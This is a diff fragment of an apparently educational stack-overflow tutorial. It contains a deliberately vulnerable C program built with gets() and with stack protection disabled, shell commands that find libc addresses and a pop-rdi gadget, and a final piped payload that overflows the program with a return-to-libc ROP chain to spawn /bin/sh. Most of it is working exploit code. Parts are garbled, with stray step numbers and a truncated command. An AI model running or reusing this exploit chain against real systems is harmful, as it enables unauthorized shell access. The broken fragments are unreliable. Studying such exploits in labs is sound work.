@@ -68,3 +68,79 @@ needle1: .octa 0xdeadbeef\n\
 }
 
 objdump -d ropshell | sed -n '/needle0/,/needle1/p'. 
+
+. xxd -s0x4b8 -l40 -p ropshell shellcode
+
+#include <stdio.h>
+int main() {
+char name[64];
+printf("%p\n", name);  // Print address of buffer.
+puts("What's your name?");
+gets(name);
+printf("Hello, %s!\n", name);
+return 0;
+}
+
+gcc -o victim -fno-stack-protector victim.c.
+
+
+ ((cat ropshell ; printf %080d 0 ; echo $a) | xxd -r -p ; cat ) | ./ropshell.
+ 
+ 
+ objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep -B5 ret. 
+ 
+ 
+ xxd -c1 -p /lib/x86_64-linux-gnu/libc.so.6 | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}'
+ 
+ 
+ a. pid=`ps -C victim -o pid --no-headers | tr -d ' '`
+
+b. grep libc /proc/$pid/maps
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main() {
+char cmd[64];
+sprintf(cmd, "pmap %d", getpid());
+system(cmd);
+return 0;
+}
+
+
+40.-
+
+a. libc=/lib/x86_64-linux-gnu/libc.so.6
+
+b. base=0x$(setarch `arch` -R ./base | grep -m1 libc | cut -f1 -d' ')
+
+c. echo …base at $base
+
+d. system=0x$(nm -D $libc | grep '\<system>' | cut -f1 -d' ')
+
+e. echo …system at $system
+
+f. exit=0x$(nm -D $libc | grep '\<exit>' | cut -f1 -d' ')
+
+g. echo …exit at $exit
+
+h. gadget=0x$(xxd -c1 -p $libc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')
+
+i. echo …push-RDI gadget at $gadget
+
+
+48. Enter nm -D /lib/ x86_64-linux-gnu/libc.so.6 | grep '\
+
+
+addr=$(echo | setarch $(arch) -R ./victim | sed 1q)
+( (
+echo  -n /bin/sh | xxd -p
+printf %0130d 0
+printf %016x $((base+gadget)) | tac -rs..
+printf %016x $((addr)) | tac -rs..
+printf %016x $((base+system)) | tac -rs..
+printf %016x $((base+exit)) | tac -rs..
+echo
+) | xxd -r -p ; cat) | setarch `arch` -R ./victim
